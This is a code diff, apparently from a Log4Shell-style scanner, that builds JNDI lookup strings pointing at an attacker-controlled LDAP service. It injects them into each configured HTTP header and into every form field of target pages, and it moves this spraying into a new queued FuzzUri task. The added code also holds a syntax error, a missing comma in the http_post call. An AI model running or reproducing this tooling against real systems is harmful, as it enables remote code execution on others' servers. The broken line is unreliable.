@@ -129,6 +129,19 @@ class LDAP(services.Service):
         writer.close()
 
 
+class FuzzUri(scenarios.Scene):
+
+    async def task(self, target, headers, payload):
+        response = await self.http_get(target, headers)
+        logging.debug('Got HTTP response: ' + str(response))
+        if response['status'] == 200:
+            input_fields = BeautifulSoup(response['content'], 'html.parser').find_all('input')
+            if input_fields:
+                data = {field.get('name'): payload for field in input_fields}
+                response = await self.http_post(target, data headers)
+                logging.debug('Got HTTP response: ' + str(response))
+
+
 class SendRequests(scenarios.Scene):
 
     async def task(self):
@@ -139,28 +152,13 @@ class SendRequests(scenarios.Scene):
                     stagers.append(
                         Template('${' + bypass + '/' + ldap_type + '}').substitute(LDAP_PORT=port, **self.context)
                     )
-
         for stager in stagers:
             logging.debug('Using stager: ' + stager)
             for header in config.HTTP_HEADERS:
                 logging.debug('Using header: ' + header)
                 headers = {header: stager}
                 for target in config.TARGETS:
-                    response = await self.http_get(
-                        target,
-                        headers,
-                    )
-                    logging.debug('Got HTTP response: ' + str(response))
-                    if response['status'] == 200:
-                        input_fields = BeautifulSoup(response['content'], 'html.parser').find_all('input')
-                        if input_fields:
-                            data = {field.get('name'): stager for field in input_fields}
-                            response = await self.http_post(
-                                target,
-                                data,
-                                headers,
-                            )
-                            logging.debug('Got HTTP response: ' + str(response))
+                    self.queue.add(FuzzUri, target, headers, stager)
 
 
 class Server(services.HTTPStatic):
